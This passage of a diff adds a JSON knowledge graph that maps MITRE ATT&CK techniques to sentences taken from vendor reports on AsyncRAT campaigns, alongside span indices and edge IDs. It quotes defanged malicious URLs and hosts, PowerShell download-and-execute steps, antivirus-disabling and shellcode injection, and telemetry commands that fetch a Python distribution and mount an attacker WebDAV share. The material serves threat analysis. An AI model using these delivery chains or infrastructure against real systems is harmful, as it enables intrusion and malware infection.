+                "This new ZIP file houses the Python script used to execute the AsyncRAT malware.",
+                "The ‘Rechnung herunterladen’ button hides the Dropbox URL (hxxps[:]//dl[.]dropboxusercontent[.]com/scl/fi/7j2004fcny2crqxfl4qfj/R000193294-672PDF[.]zip) that downloads the first ZIP file.",
+                "This zip files consists of the .URL file which is an internet shortcut file."
+              ],
+              [
+                "When a user clicks the .LNK file, it triggers PowerShell to download a JavaScript file from the same TryCloudflare tunnel i.e."
+              ],
+              [
+                "On deobfuscating the JavaScript file, we get the following code.",
+                "We can see that this JS file is then downloading the BAT file from the same TryCloudflare tunnel.",
+                "The .BAT file is heavily obfuscated and uses PowerShell to download a ZIP file that retrieves a Python package.",
+                "The PowerShell \"Invoke-WebRequest\" command is utilized to download a large Python package containing malicious .py scripts.",
+                "Additionally, it downloads a legitimate-looking PDF file to mask its activities, displaying the fake invoice PDF to deceive the victim.",
+                "The BAT file downloads a zip file (ma.zip) which consists of a large folder with multiple subfolders and .bin, .py and .exe files.",
+                "However, most of these files are used for typical Python setup.",
+                "These Python packages enable attackers to run the malicious Python code, even if Python is not installed locally."
+              ],
+              [
+                "The load.py file is base 64 encoded but after deobfuscating we get the full code.",
+                "The python file’s main objective is to go through each of the bin file which stores Shell code, and each consist of different malware types.",
+                "We can see that the python file calls the ctypes library, which is a foreign function library for Python.",
+                "It provides C-compatible data types and allows calling functions in DLLs or shared libraries.",
+                "Process injection will be done by injecting shellcode via Early Bird APC Queue."
+              ],
+              [
+                "The campaign employs a multi-step process to evade detection, starting with the execution of an LNK file, then running a JS file, followed by downloading a BAT file, eventually retrieving an obfuscated BAT file that extracts malicious Python scripts."
+              ]
+            ]
+          },
+          "TTP:T1059_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": {
+            "best_span_ranges": [
+              [
+                2,
+                2
+              ],
+              [
+                4,
+                4
+              ],
+              [
+                7,
+                7
+              ],
+              [
+                26,
+                28
+              ],
+              [
+                30,
+                30
+              ],
+              [
+                32,
+                32
+              ],
+              [
+                40,
+                40
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "- The attack uses legitimate Python downloads from official sources, establishing a complete Python environment on victim systems to execute sophisticated code injection techniques targeting explorer.exe processes."
+              ],
+              [
+                "- The malware ensures persistence through multiple vectors including startup folder scripts (ahke.bat, olsm.bat), WebDAV mounting, and legitimate \"living-off-the-land\" techniques using Windows Script Host, PowerShell, and built-in system utilities to evade detection."
+              ],
+              [
+                "The initial payload, a Windows Script Host (WSH) file, was designed to download and execute additional malicious scripts hosted on a WebDAV server."
+              ],
+              [
+                "The Vio.bat file is responsible for executing a PowerShell command that downloads the Python 3.14.0 embedded distribution zip file from the official Python website and saves it to the user's local temporary directory, specifically at C:\\Users\\<username>\\AppData\\Local\\Temp\\p.zip.",
+                "processFilePath: C:\\Windows\\System32\\cmd.exe\nprocessCmd: C:\\WINDOWS\\system32\\cmd.exe /c \"\"C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\vio.bat\" h \"\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nobjectCmd: powershell -Command \"iwr 'https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip' -OutFile 'C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\p.zip'\"\nThe other downloaded batch file (xeno.bat) has near-identical functions to vio.bat.",
+                "This batch file (xeno.bat) invokes PowerShell to download a ZIP file from the internet and save it to the user's temporary folder."
+              ],
+              [
+                "The archive p.zip was then extracted using the PowerShell command Expand-Archive to C:\\Users\\<USERNAME>\\AppData\\Local\\z1man."
+              ],
+              [
+                "We observed python.exe being used to perform code injection into explorer.exe via the command python ne.py new.bin -k a.txt."
+              ],
+              [
+                "The ne.py Python script is used for Polymorphic Asynchronous Procedure Call (APC) Injection, which is a method of executing arbitrary code in the address space of a separate live process."
+              ]
+            ]
+          },
+          "TTP:T1059_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": {
+            "best_span_ranges": [
+              [
+                8,
+                8
+              ],
+              [
+                10,
+                14
+              ],
+              [
+                17,
+                18
+              ],
+              [
+                21,
+                22
+              ],
+              [
+                27,
+                28
+              ],
+              [
+                39,
+                40
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "This ISO file contains a VBScript called “qr_thailand_pass.vbs” file which begins the malware activity."
+              ],
+              [
+                "After de-obfuscating the VBScript, we can see that the script tries to download a Testavast+denf.txt file from the web hosting site(ec2-34-229-64-131[.]compute-1[.]amazonaws[.]com) and executes the code using the “IEX” operation with the help of “powershell”.",
+                "The following image shows the content of the Testavast+denf.txt file which contains a code to check if antivirus services ESET, Avast, AVG, or Malwarebytes are running.",
+                "If any of those services is found, the script modifies the execution flow of the malware to get around the antivirus, and downloads the appropriate files in order to do so.",
+                "It saves the files related to the antivirus service as untitled.ps1 and executes that powershell script.",
+                "While execution flows are modified if AV services are found to be present, the final payload (AsyncRAT malware) remains the same."
+              ],
+              [
+                "The image depicts the content of the supporting files like admin.vbs, admin.ps1, 1_powerrun.vbs, 1.bat and 1.ps1 whose main task is to stop the particular AV service to evade detection and to execute the malware attack.",
+                "The final goal of the “1.ps1” powershell script is to stop the MalwareBytes service and add exclusion for the supporting files during the real time scanning as depicted below."
+              ],
+              [
+                "Here the script downloads “task.txt”, “SecurityHealth.exe” and “SecurityHealth.exe.manifest” files from the following domain “hxxp://microsoft[.]soundcast[.]me”.",
+                "Then, it executes the “task.txt” file as “untitled.ps1”."
+              ],
+              [
+                "The following image shows the decoded content present in the SecurityHealth[.]exe[.]manifest containing the URL(34[.]71[.]81[.]158/Run/aaa.ps1) to download the malicious powershell script(aaa.ps1).",
+                "The downloaded powershell script aaa.ps1 contains the same AyncRAT payload which is present in the killd.txt file(Malwarebytes AV related file)."
+              ],
+              [
+                "Similar campaign - Delivery using Discord CDN:\ncdn[.]discordapp[.]com/attachments/921529408060289114/947221997325258772/qr_thailand_pass.zip.",
+                "We have seen several other Thailand Pass organization spam templates that directly deliver the VBScript file that leads to the delivery of the same AsyncRAT malware, as shown below."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1105",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1105",
+        "ttp_id": "T1105",
+        "best_span_sentences_list": [
+          [
+            "The Forcepoint X-Labs research team recently identified another AsyncRAT malware campaign that leverages malicious payloads delivered through suspicious TryCloudflare quick tunnels and Python packages."
+          ],
+          [
+            "Like we said, the URL downloads a ZIP file, which includes an internet shortcut file (.URL format).",
+            "This file leads to a .lnk file, which then leads to a JavaScript file.",
+            "This JS file links to a .BAT file which hosts malicious content that ultimately delivers another ZIP file.",
+            "This new ZIP file houses the Python script used to execute the AsyncRAT malware.",
+            "The ‘Rechnung herunterladen’ button hides the Dropbox URL (hxxps[:]//dl[.]dropboxusercontent[.]com/scl/fi/7j2004fcny2crqxfl4qfj/R000193294-672PDF[.]zip) that downloads the first ZIP file.",
+            "This zip files consists of the .URL file which is an internet shortcut file."
+          ],
+          [
+            "When a user clicks the .LNK file, it triggers PowerShell to download a JavaScript file from the same TryCloudflare tunnel i.e."
+          ],
+          [
+            "On deobfuscating the JavaScript file, we get the following code.",
+            "We can see that this JS file is then downloading the BAT file from the same TryCloudflare tunnel.",
+            "The .BAT file is heavily obfuscated and uses PowerShell to download a ZIP file that retrieves a Python package.",
+            "The PowerShell \"Invoke-WebRequest\" command is utilized to download a large Python package containing malicious .py scripts.",
+            "Additionally, it downloads a legitimate-looking PDF file to mask its activities, displaying the fake invoice PDF to deceive the victim.",
+            "The BAT file downloads a zip file (ma.zip) which consists of a large folder with multiple subfolders and .bin, .py and .exe files.",
+            "However, most of these files are used for typical Python setup.",
+            "These Python packages enable attackers to run the malicious Python code, even if Python is not installed locally."
+          ],
+          [
+            "This AsyncRAT campaign has again showed how hackers can use legitimate infrastructures like Dropbox URLs and TryCloudflare to their advantage.",
+            "Payloads are downloaded through Dropbox URLs and temporary TryCloudflare tunnel infrastructure, thereby tricking recipients into believing their legitimacy."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            2,
+            2
+          ],
+          [
+            10,
+            15
+          ],
+          [
+            20,
+            20
+          ],
+          [
+            22,
+            29
+          ],
+          [
+            40,
+            41
+          ]
+        ],
+        "edges": [
+          "EDGE_b2e3ca95dd62",
+          "EDGE_bf6b80edeccf",
+          "EDGE_c4afabd72079",
+          "EDGE_ced084c84501",
+          "EDGE_f67d447518ca",
+          "EDGE_ff6275ff963c",
+          "EDGE_0f781793f078",
+          "EDGE_1bd523346af0",
+          "EDGE_25afff398873",
+          "EDGE_3a2f84373dd1",
+          "EDGE_3ab01422dab0",
+          "EDGE_40422d3334f9",
+          "EDGE_4c19d9b1bb52",
+          "EDGE_4f7ab8ae5ceb",
+          "EDGE_7adb15690831",
+          "EDGE_b501fc3fdfbb",
+          "EDGE_bdfed18f9ed1",
+          "EDGE_c0ffb155a3e0",
+          "EDGE_fa6d1c0da8b5",
+          "EDGE_1d6053e2c9b1",
+          "EDGE_2f0ff980242c",
+          "EDGE_6a4b32dc8cc2",
+          "EDGE_9003a87fdc48",
+          "EDGE_aefa2a1585b2",
+          "EDGE_c68d8c983667",
+          "EDGE_ddf01b7b3a59",
+          "EDGE_e224dd9c03d9"
+        ],
+        "source": {
+          "TTP:T1105_www.forcepoint.com_blog_x-labs_asyncrat-reloaded-python-trycloudflare-malware": {
+            "best_span_ranges": [
+              [
+                2,
+                2
+              ],
+              [
+                10,
+                15
+              ],
+              [
+                20,
+                20
+              ],
+              [
+                22,
+                29
+              ],
+              [
+                40,
+                41
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The Forcepoint X-Labs research team recently identified another AsyncRAT malware campaign that leverages malicious payloads delivered through suspicious TryCloudflare quick tunnels and Python packages."
+              ],
+              [
+                "Like we said, the URL downloads a ZIP file, which includes an internet shortcut file (.URL format).",
+                "This file leads to a .lnk file, which then leads to a JavaScript file.",
+                "This JS file links to a .BAT file which hosts malicious content that ultimately delivers another ZIP file.",
+                "This new ZIP file houses the Python script used to execute the AsyncRAT malware.",
+                "The ‘Rechnung herunterladen’ button hides the Dropbox URL (hxxps[:]//dl[.]dropboxusercontent[.]com/scl/fi/7j2004fcny2crqxfl4qfj/R000193294-672PDF[.]zip) that downloads the first ZIP file.",
+                "This zip files consists of the .URL file which is an internet shortcut file."
+              ],
+              [
+                "When a user clicks the .LNK file, it triggers PowerShell to download a JavaScript file from the same TryCloudflare tunnel i.e."
+              ],
+              [
+                "On deobfuscating the JavaScript file, we get the following code.",
+                "We can see that this JS file is then downloading the BAT file from the same TryCloudflare tunnel.",
+                "The .BAT file is heavily obfuscated and uses PowerShell to download a ZIP file that retrieves a Python package.",
+                "The PowerShell \"Invoke-WebRequest\" command is utilized to download a large Python package containing malicious .py scripts.",
+                "Additionally, it downloads a legitimate-looking PDF file to mask its activities, displaying the fake invoice PDF to deceive the victim.",
+                "The BAT file downloads a zip file (ma.zip) which consists of a large folder with multiple subfolders and .bin, .py and .exe files.",
+                "However, most of these files are used for typical Python setup.",
+                "These Python packages enable attackers to run the malicious Python code, even if Python is not installed locally."
+              ],
+              [
+                "This AsyncRAT campaign has again showed how hackers can use legitimate infrastructures like Dropbox URLs and TryCloudflare to their advantage.",
+                "Payloads are downloaded through Dropbox URLs and temporary TryCloudflare tunnel infrastructure, thereby tricking recipients into believing their legitimacy."
+              ]
+            ]
+          },
+          "TTP:T1105_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": {
+            "best_span_ranges": [
+              [
+                7,
+                7
+              ],
+              [
+                12,
+                12
+              ],
+              [
+                26,
+                28
+              ],
+              [
+                34,
+                34
+              ],
+              [
+                36,
+                36
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The initial payload, a Windows Script Host (WSH) file, was designed to download and execute additional malicious scripts hosted on a WebDAV server."
+              ],
+              [
+                "When opened, the file redirects users to download multi-stage scripts hosted on TryCloudflare domains."
+              ],
+              [
+                "The Vio.bat file is responsible for executing a PowerShell command that downloads the Python 3.14.0 embedded distribution zip file from the official Python website and saves it to the user's local temporary directory, specifically at C:\\Users\\<username>\\AppData\\Local\\Temp\\p.zip.",
+                "processFilePath: C:\\Windows\\System32\\cmd.exe\nprocessCmd: C:\\WINDOWS\\system32\\cmd.exe /c \"\"C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\vio.bat\" h \"\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nobjectCmd: powershell -Command \"iwr 'https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip' -OutFile 'C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\p.zip'\"\nThe other downloaded batch file (xeno.bat) has near-identical functions to vio.bat.",
+                "This batch file (xeno.bat) invokes PowerShell to download a ZIP file from the internet and save it to the user's temporary folder."
+              ],
+              [
+                "Note that in some cases, Python was not downloaded from the official website, instead, the net use command was used to mount the WebDAV server where the Python library was hosted."
+              ],
+              [
+                "objectCmd: net use Q: \"\\\\syracuse-seeks-wilson-row.trycloudflare[.]com@SSL\\of\" /persistent:no\nThe Python library was then extracted from the mounted Q drive to C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\SystemCache25."
+              ]
+            ]
+          },
+          "TTP:T1105_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": {
+            "best_span_ranges": [
+              [
+                10,
+                14
+              ],
+              [
+                16,
+                16
+              ],
+              [
+                19,
+                22
+              ],
+              [
+                27,
+                27
+              ],
+              [
+                39,
+                40
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "After de-obfuscating the VBScript, we can see that the script tries to download a Testavast+denf.txt file from the web hosting site(ec2-34-229-64-131[.]compute-1[.]amazonaws[.]com) and executes the code using the “IEX” operation with the help of “powershell”.",
+                "The following image shows the content of the Testavast+denf.txt file which contains a code to check if antivirus services ESET, Avast, AVG, or Malwarebytes are running.",
+                "If any of those services is found, the script modifies the execution flow of the malware to get around the antivirus, and downloads the appropriate files in order to do so.",
+                "It saves the files related to the antivirus service as untitled.ps1 and executes that powershell script.",
+                "While execution flows are modified if AV services are found to be present, the final payload (AsyncRAT malware) remains the same."
+              ],
+              [
+                "The following image shows the content of the killd.txt file which downloads the supporting files from web hosting site(ec2-34-229-64-131[.]compute-1[.]amazonaws[.]com)."
+              ],
+              [
+                "After disabling the running antivirus service, it downloads the AsyncRAT malware from the killd.txt file and starts its malicious activity on the victim's machine.",
+                "If no antivirus services are detected on the victim machine then the code will move to the “else” as shown below.",
+                "Here the script downloads “task.txt”, “SecurityHealth.exe” and “SecurityHealth.exe.manifest” files from the following domain “hxxp://microsoft[.]soundcast[.]me”.",
+                "Then, it executes the “task.txt” file as “untitled.ps1”."
+              ],
+              [
+                "The following image shows the decoded content present in the SecurityHealth[.]exe[.]manifest containing the URL(34[.]71[.]81[.]158/Run/aaa.ps1) to download the malicious powershell script(aaa.ps1)."
+              ],
+              [
+                "Similar campaign - Delivery using Discord CDN:\ncdn[.]discordapp[.]com/attachments/921529408060289114/947221997325258772/qr_thailand_pass.zip.",
+                "We have seen several other Thailand Pass organization spam templates that directly deliver the VBScript file that leads to the delivery of the same AsyncRAT malware, as shown below."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1140",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1140",
+        "ttp_id": "T1140",
+        "best_span_sentences_list": [
+          [
+            "The load.py file is base 64 encoded but after deobfuscating we get the full code.",
+            "The python file’s main objective is to go through each of the bin file which stores Shell code, and each consist of different malware types.",
+            "We can see that the python file calls the ctypes library, which is a foreign function library for Python.",
+            "It provides C-compatible data types and allows calling functions in DLLs or shared libraries.",
+            "Process injection will be done by injecting shellcode via Early Bird APC Queue."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            31,
+            35
+          ]
+        ],
+        "edges": [
+          "EDGE_95c6fdf6531e",
+          "EDGE_ccb69d26b808"
+        ],
+        "source": {
+          "TTP:T1140_www.forcepoint.com_blog_x-labs_asyncrat-reloaded-python-trycloudflare-malware": {
+            "best_span_ranges": [
+              [
+                31,
+                35
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The load.py file is base 64 encoded but after deobfuscating we get the full code.",
+                "The python file’s main objective is to go through each of the bin file which stores Shell code, and each consist of different malware types.",
+                "We can see that the python file calls the ctypes library, which is a foreign function library for Python.",
+                "It provides C-compatible data types and allows calling functions in DLLs or shared libraries.",
+                "Process injection will be done by injecting shellcode via Early Bird APC Queue."
+              ]
+            ]
+          },
+          "TTP:T1140_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": {
+            "best_span_ranges": [
+              [
+                43,
+                43
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The a.txt file contains keys used by ne.py to decrypt the obfuscated input binary file new.bin."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1204",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1204",
+        "ttp_id": "T1204",
+        "best_span_sentences_list": [
+          [
+            "This campaign begins with a phishing email containing a Dropbox URL.",
+            "When the recipient clicks on the link, a ZIP file is downloaded.",
+            "This file contains an internet shortcut file in a .URL format.",
+            "Opening this file leads to downloading multiple malware payloads in the background while the user is deceived by a legitimate looking PDF opening.",
+            "Like we said, the URL downloads a ZIP file, which includes an internet shortcut file (.URL format).",
+            "This file leads to a .lnk file, which then leads to a JavaScript file.",
+            "This JS file links to a .BAT file which hosts malicious content that ultimately delivers another ZIP file.",
+            "This new ZIP file houses the Python script used to execute the AsyncRAT malware.",
+            "The ‘Rechnung herunterladen’ button hides the Dropbox URL (hxxps[:]//dl[.]dropboxusercontent[.]com/scl/fi/7j2004fcny2crqxfl4qfj/R000193294-672PDF[.]zip) that downloads the first ZIP file."
+          ],
+          [
+            "When a user clicks the .LNK file, it triggers PowerShell to download a JavaScript file from the same TryCloudflare tunnel i.e."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            6,
+            14
+          ],
+          [
+            20,
+            20
+          ]
+        ],
+        "edges": [
+          "EDGE_56128b297bdc",
+          "EDGE_8790d80d1ece",
+          "EDGE_9f1fec8e3945",
+          "EDGE_b56c1dd0af73",
+          "EDGE_8beccf0ea34c"
+        ],
+        "source": {
+          "TTP:T1204_www.forcepoint.com_blog_x-labs_asyncrat-reloaded-python-trycloudflare-malware": {
+            "best_span_ranges": [
+              [
+                6,
+                14
+              ],
+              [
+                20,
+                20
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "This campaign begins with a phishing email containing a Dropbox URL.",
+                "When the recipient clicks on the link, a ZIP file is downloaded.",
+                "This file contains an internet shortcut file in a .URL format.",
+                "Opening this file leads to downloading multiple malware payloads in the background while the user is deceived by a legitimate looking PDF opening.",
+                "Like we said, the URL downloads a ZIP file, which includes an internet shortcut file (.URL format).",
+                "This file leads to a .lnk file, which then leads to a JavaScript file.",
+                "This JS file links to a .BAT file which hosts malicious content that ultimately delivers another ZIP file.",
+                "This new ZIP file houses the Python script used to execute the AsyncRAT malware.",
+                "The ‘Rechnung herunterladen’ button hides the Dropbox URL (hxxps[:]//dl[.]dropboxusercontent[.]com/scl/fi/7j2004fcny2crqxfl4qfj/R000193294-672PDF[.]zip) that downloads the first ZIP file."
+              ],
+              [
+                "When a user clicks the .LNK file, it triggers PowerShell to download a JavaScript file from the same TryCloudflare tunnel i.e."
+              ]
+            ]
+          },
+          "TTP:T1204_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": {
+            "best_span_ranges": [
+              [
+                3,
+                3
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "- The campaign begins with phishing emails distributed via Dropbox links, using double-extension files (.pdf.url) to deceive victims, and displaying legitimate PDF documents during execution to reduce suspicion."
+              ]
+            ]
+          },
+          "TTP:T1204_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": {
+            "best_span_ranges": [
+              [
+                3,
+                3
+              ],
+              [
+                6,
+                6
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Attackers trick victims using a spoof web page that poses as Thailand Pass, ultimately baiting users into downloading AsyncRAT."
+              ],
+              [
+                "hxxps://bit[.]ly/Thailand-passport - is an shortened URL of\nhxxps://onedrive.live[.]com/Download?cid=6BCBE135551869F2&resid=6BCBE135551869F2!168&authkey=AGoYtbf1Lb5VjFg\nOn accessing the above URL, the page delivers a HTML file named “Thailand Pass Registration System (for air travel.html”."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1219",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1219",
+        "ttp_id": "T1219",
+        "best_span_sentences_list": [
+          [
+            "AsyncRAT is remote access trojan (RAT) that exploits the async/await pattern for efficient, asynchronous communication."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            0,
+            0
+          ]
+        ],
+        "edges": [
+          "EDGE_3527e1f69df2",
+          "EDGE_baa544f5310a"
+        ],
+        "source": {
+          "TTP:T1219_www.forcepoint.com_blog_x-labs_asyncrat-reloaded-python-trycloudflare-malware": {
+            "best_span_ranges": [
+              [
+                0,
+                0
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "AsyncRAT is remote access trojan (RAT) that exploits the async/await pattern for efficient, asynchronous communication."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1566",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1566",
+        "ttp_id": "T1566",
+        "best_span_sentences_list": [
+          [
+            "This campaign begins with a phishing email containing a Dropbox URL.",
+            "When the recipient clicks on the link, a ZIP file is downloaded.",
+            "This file contains an internet shortcut file in a .URL format.",
+            "Opening this file leads to downloading multiple malware payloads in the background while the user is deceived by a legitimate looking PDF opening.",
+            "Like we said, the URL downloads a ZIP file, which includes an internet shortcut file (.URL format)."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            6,
+            10
+          ]
+        ],
+        "edges": [
+          "EDGE_590f2ce7205b",
+          "EDGE_98b31a668151",
+          "EDGE_bea7e07df8f9",
+          "EDGE_0097d63541aa",
+          "EDGE_ba0ac9566e93",
+          "EDGE_94120b598628",
+          "EDGE_d3cd7a3fff92"
+        ],
+        "source": {
+          "TTP:T1566_www.forcepoint.com_blog_x-labs_asyncrat-reloaded-python-trycloudflare-malware": {
+            "best_span_ranges": [
+              [
+                6,
+                10
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "This campaign begins with a phishing email containing a Dropbox URL.",
+                "When the recipient clicks on the link, a ZIP file is downloaded.",
+                "This file contains an internet shortcut file in a .URL format.",
+                "Opening this file leads to downloading multiple malware payloads in the background while the user is deceived by a legitimate looking PDF opening.",
+                "Like we said, the URL downloads a ZIP file, which includes an internet shortcut file (.URL format)."
+              ]
+            ]
+          },
+          "TTP:T1566_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": {
+            "best_span_ranges": [
+              [
+                3,
+                3
+              ],
+              [
+                11,
+                11
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "- The campaign begins with phishing emails distributed via Dropbox links, using double-extension files (.pdf.url) to deceive victims, and displaying legitimate PDF documents during execution to reduce suspicion."
+              ],
+              [
+                "During the initial stages of the attack, users received a phishing email containing a Dropbox link leading to an Internet Shortcut file(.url)."
+              ]
+            ]
+          },
+          "TTP:T1566_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": {
+            "best_span_ranges": [
+              [
+                3,
+                3
+              ],
+              [
+                6,
+                6
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Attackers trick victims using a spoof web page that poses as Thailand Pass, ultimately baiting users into downloading AsyncRAT."
+              ],
+              [
+                "hxxps://bit[.]ly/Thailand-passport - is an shortened URL of\nhxxps://onedrive.live[.]com/Download?cid=6BCBE135551869F2&resid=6BCBE135551869F2!168&authkey=AGoYtbf1Lb5VjFg\nOn accessing the above URL, the page delivers a HTML file named “Thailand Pass Registration System (for air travel.html”."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1036",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1036",
+        "ttp_id": "T1036",
+        "best_span_sentences_list": [
+          [
+            "- The campaign begins with phishing emails distributed via Dropbox links, using double-extension files (.pdf.url) to deceive victims, and displaying legitimate PDF documents during execution to reduce suspicion."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            3,
+            3
+          ]
+        ],
+        "edges": [
+          "EDGE_744a5eba4fe2",
+          "EDGE_f44ec0ba4995"
+        ],
+        "source": {
+          "TTP:T1036_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": {
+            "best_span_ranges": [
+              [
+                3,
+                3
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "- The campaign begins with phishing emails distributed via Dropbox links, using double-extension files (.pdf.url) to deceive victims, and displaying legitimate PDF documents during execution to reduce suspicion."
+              ]
+            ]
+          },
+          "TTP:T1036_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": {
+            "best_span_ranges": [
+              [
+                29,
+                29
+              ],
+              [
+                33,
+                33
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The variable $Filc contains the actual AsyncRAT malware payload, which is injected into a legitimate aspnet_compiler.exe file to show it as a genuine file running in background."
+              ],
+              [
+                "The injected malware payload runs as a legitimate aspnet_compiler.exe process as shown below."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1071",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1071",
+        "ttp_id": "T1071",
+        "best_span_sentences_list": [
+          [
+            "Overview\n- AsyncRAT-connected threat actors are exploiting Cloudflare's free-tier services and TryCloudflare tunneling domains to host their WebDAV servers, masking malicious activities under trusted infrastructure and making detections challenging for traditional security solutions while ensuring reliable payload delivery."
+          ],
+          [
+            "Next, the svchost.exe process initiates the WebClient service to enable interaction with WebDAV servers.",
+            "Meanwhile, rundll32.exe executes the DavSetCookie function from davclnt.dll with parameters specifying a WebDAV server (plus-condos-thy-redeem.trycloudflare[.]com) and an SSL connection."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            1,
+            1
+          ],
+          [
+            20,
+            21
+          ]
+        ],
+        "edges": [
+          "EDGE_8ec1448c1e16",
+          "EDGE_a63c539c46dd",
+          "EDGE_e02c33d1db18"
+        ],
+        "source": {
+          "TTP:T1071_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": {
+            "best_span_ranges": [
+              [
+                1,
+                1
+              ],
+              [
+                20,
+                21
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Overview\n- AsyncRAT-connected threat actors are exploiting Cloudflare's free-tier services and TryCloudflare tunneling domains to host their WebDAV servers, masking malicious activities under trusted infrastructure and making detections challenging for traditional security solutions while ensuring reliable payload delivery."
+              ],
+              [
+                "Next, the svchost.exe process initiates the WebClient service to enable interaction with WebDAV servers.",
+                "Meanwhile, rundll32.exe executes the DavSetCookie function from davclnt.dll with parameters specifying a WebDAV server (plus-condos-thy-redeem.trycloudflare[.]com) and an SSL connection."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1102",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1102",
+        "ttp_id": "T1102",
+        "best_span_sentences_list": [
+          [
+            "Overview\n- AsyncRAT-connected threat actors are exploiting Cloudflare's free-tier services and TryCloudflare tunneling domains to host their WebDAV servers, masking malicious activities under trusted infrastructure and making detections challenging for traditional security solutions while ensuring reliable payload delivery."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            1,
+            1
+          ]
+        ],
+        "edges": [
+          "EDGE_07ed8643100d",
+          "EDGE_1a3ca7c48329",
+          "EDGE_413a10566f8a",
+          "EDGE_48412b2bbc22"
+        ],
+        "source": {
+          "TTP:T1102_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": {
+            "best_span_ranges": [
+              [
+                1,
+                1
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Overview\n- AsyncRAT-connected threat actors are exploiting Cloudflare's free-tier services and TryCloudflare tunneling domains to host their WebDAV servers, masking malicious activities under trusted infrastructure and making detections challenging for traditional security solutions while ensuring reliable payload delivery."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1218",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1218",
+        "ttp_id": "T1218",
+        "best_span_sentences_list": [
+          [
+            "Meanwhile, rundll32.exe executes the DavSetCookie function from davclnt.dll with parameters specifying a WebDAV server (plus-condos-thy-redeem.trycloudflare[.]com) and an SSL connection."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            21,
+            21
+          ]
+        ],
+        "edges": [
+          "EDGE_b6ff033bc844",
+          "EDGE_c5048fe8088d"
+        ],
+        "source": {
+          "TTP:T1218_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": {
+            "best_span_ranges": [
+              [
+                21,
+                21
